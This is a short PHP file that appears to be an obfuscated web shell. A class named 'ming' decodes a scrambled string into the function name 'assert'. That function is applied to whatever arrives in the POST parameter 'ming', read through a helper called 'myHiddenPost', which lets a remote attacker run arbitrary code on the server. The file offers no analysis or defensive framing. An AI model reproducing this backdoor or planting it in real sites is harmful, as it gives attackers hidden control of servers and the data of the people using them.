<?php
class ming{
    function decode_ming($ling) {
        $str='e15s544mgl633610ita71478rn';
        $n=3;
        $length = strlen($str);
        $table = array();
        $quotient = (int)($length / $n);  
        $remainder = $length % $n;
        for ($i = 0; $i < $n; $i++) {
            $table[$i] = array();
        }
        $index = 0;
        for ($i = 0; $i < $n; $i++) {
            $rowCount = $quotient + ($i < $remainder ? 1 : 0);
            for ($j = 0; $j < $rowCount; $j++) {
                $table[$i][$j] = $str[$index++];
            }
        }
        $decodedStr = '';
        for ($i = 0; $i < $quotient + 1; $i++) {
            for ($j = 0; $j < $n; $j++) {
                if (isset($table[$j][$i])) {
                    $decodedStr .= $table[$j][$i];
                }
            }
        }
        $config=$decodedStr['2'].$decodedStr['9'].$decodedStr['9'].$decodedStr['0'].$decodedStr['20'].$decodedStr['25'];
        return $config($ling);
    }
}
$ming=new ming();
function myHiddenPost($key) {
    return isset($_POST[$key]) ? $_POST[$key] : null;
}
$mingValue = myHiddenPost('ming');
$ming->decode_ming($mingValue);

?>
